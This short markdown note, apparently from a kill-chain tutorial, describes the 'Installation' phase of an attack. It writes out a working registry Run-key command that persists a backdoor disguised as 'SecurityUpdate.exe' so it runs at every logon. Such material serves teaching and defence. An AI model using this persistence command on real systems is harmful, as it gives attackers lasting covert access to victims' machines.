# Installation

### Objective: Establish a foothold in the target system.

### Techniques:
  - Installing malware such as keyloggers, ransomware, or backdoors.
  - Leveraging persistence mechanisms (e.g., registry modifications, scheduled tasks).

To install a backdoor we run this command:

`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Users\Bob\Downloads\SecurityUpdate.exe" /f`

![image](https://github.com/user-attachments/assets/5cc9b67d-0148-4f63-9a99-89d2c3dd7bbe)

This means that every time the victim logs into the computer we get to have access to the machine without the victim needing to execute the file.
